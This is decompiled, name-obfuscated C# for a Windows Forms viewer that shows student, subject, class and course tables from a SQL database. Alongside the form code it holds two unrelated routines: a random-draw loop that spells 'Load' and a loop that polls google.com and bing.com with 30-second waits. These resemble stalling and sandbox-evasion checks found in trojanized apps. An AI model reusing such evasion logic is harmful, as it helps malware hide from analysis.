using System;
using System.ComponentModel;
using System.Data.Common;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Fg19;
using Gr4;
using Microsoft.VisualBasic.CompilerServices;

namespace Pk7n;

[DesignerGenerated]
public class e3G1 : Form
{
	private IContainer components;

	internal virtual DataGridView DataGridView1
	{
		[CompilerGenerated]
		get
		{
			return _DataGridView1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			DataGridViewCellEventHandler val = new DataGridViewCellEventHandler(c4K3);
			DataGridView dataGridView = _DataGridView1;
			if (dataGridView != null)
			{
				dataGridView.remove_CellContentClick(val);
			}
			_DataGridView1 = value;
			dataGridView = _DataGridView1;
			if (dataGridView != null)
			{
				dataGridView.add_CellContentClick(val);
			}
		}
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Wf07;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual ComboBox ComboBox1
	{
		[CompilerGenerated]
		get
		{
			return _ComboBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Zq8p;
			ComboBox comboBox = _ComboBox1;
			if (comboBox != null)
			{
				comboBox.remove_SelectedIndexChanged(eventHandler);
			}
			_ComboBox1 = value;
			comboBox = _ComboBox1;
			if (comboBox != null)
			{
				comboBox.add_SelectedIndexChanged(eventHandler);
			}
		}
	}

	internal virtual Button Button2
	{
		[CompilerGenerated]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = g3YN;
			Button button = _Button2;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button2 = value;
			button = _Button2;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button3
	{
		[CompilerGenerated]
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = c4T1;
			Button button = _Button3;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button3 = value;
			button = _Button3;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public e3G1()
	{
		((Form)this).add_Load((EventHandler)Qm8g);
		Jr75();
	}

	[DebuggerNonUserCode]
	protected override void Yr1g(bool b7G3)
	{
		try
		{
			if (b7G3 && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(b7G3);
		}
	}

	[DebuggerStepThrough]
	private void Jr75()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0137: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_0298: Unknown result type (might be due to invalid IL or missing references)
		//IL_0371: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_04de: Expected O, but got Unknown
		//IL_04ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_04f4: Expected O, but got Unknown
		//IL_04f6: Unknown result type (might be due to invalid IL or missing references)
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(e3G1));
		DataGridView1 = new DataGridView();
		Button1 = new Button();
		ComboBox1 = new ComboBox();
		Button2 = new Button();
		Button3 = new Button();
		TextBox1 = new TextBox();
		((ISupportInitialize)DataGridView1).BeginInit();
		((Control)this).SuspendLayout();
		DataGridView1.set_BackgroundColor(Color.MintCream);
		DataGridView1.set_BorderStyle((BorderStyle)2);
		DataGridView1.set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		((Control)DataGridView1).set_Location(new Point(0, 0));
		((Control)DataGridView1).set_Margin(new Padding(4));
		((Control)DataGridView1).set_Name("DataGridView1");
		((Control)DataGridView1).set_Size(new Size(902, 401));
		((Control)DataGridView1).set_TabIndex(0);
		((ButtonBase)Button1).get_FlatAppearance().set_BorderColor(Color.Teal);
		((ButtonBase)Button1).get_FlatAppearance().set_BorderSize(3);
		((ButtonBase)Button1).set_FlatStyle((FlatStyle)0);
		((Control)Button1).set_Location(new Point(292, 409));
		((Control)Button1).set_Margin(new Padding(4));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(79, 31));
		((Control)Button1).set_TabIndex(1);
		((ButtonBase)Button1).set_Text("Show");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((ListControl)ComboBox1).set_FormattingEnabled(true);
		ComboBox1.get_Items().AddRange(new object[4] { "Student Detail", "Subject Detail", "Class Detail", "Course Detail" });
		((Control)ComboBox1).set_Location(new Point(13, 409));
		((Control)ComboBox1).set_Margin(new Padding(4));
		((Control)ComboBox1).set_Name("ComboBox1");
		((Control)ComboBox1).set_Size(new Size(259, 24));
		((Control)ComboBox1).set_TabIndex(2);
		ComboBox1.set_Text("Select Value");
		((ButtonBase)Button2).get_FlatAppearance().set_BorderColor(Color.FromArgb(0, 192, 192));
		((ButtonBase)Button2).get_FlatAppearance().set_BorderSize(3);
		((ButtonBase)Button2).set_FlatStyle((FlatStyle)0);
		((Control)Button2).set_Location(new Point(399, 409));
		((Control)Button2).set_Margin(new Padding(4));
		((Control)Button2).set_Name("Button2");
		((Control)Button2).set_Size(new Size(79, 31));
		((Control)Button2).set_TabIndex(3);
		((ButtonBase)Button2).set_Text("Refresh");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		Button3.set_DialogResult((DialogResult)2);
		((ButtonBase)Button3).get_FlatAppearance().set_BorderColor(Color.Red);
		((ButtonBase)Button3).get_FlatAppearance().set_BorderSize(3);
		((ButtonBase)Button3).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(255, 224, 192));
		((ButtonBase)Button3).set_FlatStyle((FlatStyle)0);
		((Control)Button3).set_Location(new Point(503, 409));
		((Control)Button3).set_Margin(new Padding(4));
		((Control)Button3).set_Name("Button3");
		((Control)Button3).set_Size(new Size(79, 31));
		((Control)Button3).set_TabIndex(4);
		((ButtonBase)Button3).set_Text("Cancel");
		((ButtonBase)Button3).set_UseVisualStyleBackColor(true);
		((Control)TextBox1).set_Location(new Point(12, 409));
		((Control)TextBox1).set_Name("TextBox1");
		((Control)TextBox1).set_Size(new Size(260, 22));
		((Control)TextBox1).set_TabIndex(5);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(9f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSize(true);
		((Form)this).set_BackColor(Color.MintCream);
		((Form)this).set_CancelButton((IButtonControl)(object)Button3);
		((Form)this).set_ClientSize(new Size(902, 453));
		((Control)this).get_Controls().Add((Control)(object)Button3);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)ComboBox1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)DataGridView1);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_Margin(new Padding(4));
		((Control)this).set_Name("Viewer");
		((Form)this).set_Text("Viewer");
		((ISupportInitialize)DataGridView1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Qm8g(object sender, EventArgs e)
	{
		Nn6.y6G();
	}

	private void c4K3(object sender, DataGridViewCellEventArgs e)
	{
	}

	private void Zq8p(object sender, EventArgs e)
	{
	}

	private void Wf07(object sender, EventArgs e)
	{
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_0122: Unknown result type (might be due to invalid IL or missing references)
		//IL_012c: Expected O, but got Unknown
		//IL_01d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01de: Expected O, but got Unknown
		//IL_0286: Unknown result type (might be due to invalid IL or missing references)
		//IL_0290: Expected O, but got Unknown
		TextBox1.set_Text(ComboBox1.get_Text());
		if (Operators.ConditionalCompareObjectEqual(ComboBox1.get_Items().get_Item(0), (object)TextBox1.get_Text(), false))
		{
			DataGridView1.ClearSelection();
			Nn6.ds.Clear();
			Nn6.cn.Open();
			Nn6.str = " select * from InformationForm ";
			Nn6.cmd = new SqlCommand(Nn6.str, Nn6.cn);
			Nn6.da.set_SelectCommand(Nn6.cmd);
			((DbDataAdapter)(object)Nn6.da).Fill(Nn6.ds, " InformationForm");
			Nn6.cn.Close();
			DataGridView1.set_DataSource((object)Nn6.ds.Tables[0]);
		}
		else if (Operators.ConditionalCompareObjectEqual(ComboBox1.get_Items().get_Item(1), (object)TextBox1.get_Text(), false))
		{
			DataGridView1.ClearSelection();
			Nn6.ds.Clear();
			Nn6.cn.Open();
			Nn6.str = " select * from Subject ";
			Nn6.cmd = new SqlCommand(Nn6.str, Nn6.cn);
			Nn6.da.set_SelectCommand(Nn6.cmd);
			((DbDataAdapter)(object)Nn6.da).Fill(Nn6.ds, " Subject");
			Nn6.cn.Close();
			DataGridView1.set_DataSource((object)Nn6.ds.Tables[0]);
		}
		else if (Operators.ConditionalCompareObjectEqual(ComboBox1.get_Items().get_Item(2), (object)TextBox1.get_Text(), false))
		{
			DataGridView1.ClearSelection();
			Nn6.ds.Clear();
			Nn6.cn.Open();
			Nn6.str = " select * from ClassDetail ";
			Nn6.cmd = new SqlCommand(Nn6.str, Nn6.cn);
			Nn6.da.set_SelectCommand(Nn6.cmd);
			((DbDataAdapter)(object)Nn6.da).Fill(Nn6.ds, " ClassDetail");
			Nn6.cn.Close();
			DataGridView1.set_DataSource((object)Nn6.ds.Tables[0]);
		}
		else if (Operators.ConditionalCompareObjectEqual(ComboBox1.get_Items().get_Item(3), (object)TextBox1.get_Text(), false))
		{
			DataGridView1.ClearSelection();
			Nn6.ds.Clear();
			Nn6.cn.Open();
			Nn6.str = " select * from Course ";
			Nn6.cmd = new SqlCommand(Nn6.str, Nn6.cn);
			Nn6.da.set_SelectCommand(Nn6.cmd);
			((DbDataAdapter)(object)Nn6.da).Fill(Nn6.ds, " Course");
			Nn6.cn.Close();
			DataGridView1.set_DataSource((object)Nn6.ds.Tables[0]);
		}
	}

	internal static bool a9J1(int Mc92)
	{
		string[] array = new string[4] { "L", "o", "a", "d" };
		StringBuilder stringBuilder = new StringBuilder();
		while (Operators.CompareString(stringBuilder.ToString(), "Load", false) != 0)
		{
			string text = array[new Random().Next(0, checked(Mc92 + 1))];
			if (Operators.CompareString(stringBuilder.ToString(), (string)null, false) == 0 && Operators.CompareString(text, "L", false) == 0)
			{
				stringBuilder.Append(text);
				array = new string[3] { "o", "a", "d" };
				Mc92 = -1;
			}
			if (Operators.CompareString(stringBuilder.ToString(), "L", false) == 0 && Operators.CompareString(text, "o", false) == 0)
			{
				stringBuilder.Append(text);
				array = new string[2] { "a", "d" };
				Mc92 = -1;
			}
			if (Operators.CompareString(stringBuilder.ToString(), "Lo", false) == 0 && Operators.CompareString(text, "a", false) == 0)
			{
				stringBuilder.Append(text);
				array = new string[1] { "d" };
				Mc92 = -1;
			}
			if (Operators.CompareString(stringBuilder.ToString(), "Loa", false) == 0 && Operators.CompareString(text, "d", false) == 0)
			{
				stringBuilder.Append(text);
			}
		}
		if (Operators.CompareString(stringBuilder.ToString(), "Load", false) == 0)
		{
			return true;
		}
		return false;
	}

	private void g3YN(object sender, EventArgs e)
	{
		((Control)DataGridView1).Refresh();
		Nn6.ds.Clear();
	}

	private void c4T1(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	internal static bool Wi08()
	{
		string[] array = new string[2] { "https://www.google.com/", "https://www.bing.com/" };
		int num = 0;
		checked
		{
			while (num != 2)
			{
				string[] array2 = array;
				foreach (string ts4y in array2)
				{
					if (!Rg0b.Sk15(ts4y))
					{
						if (num > 0)
						{
							num--;
						}
						Task.Delay(30000).Wait();
					}
					else
					{
						num++;
					}
				}
			}
			if (num == 2)
			{
				return true;
			}
			return false;
		}
	}
}
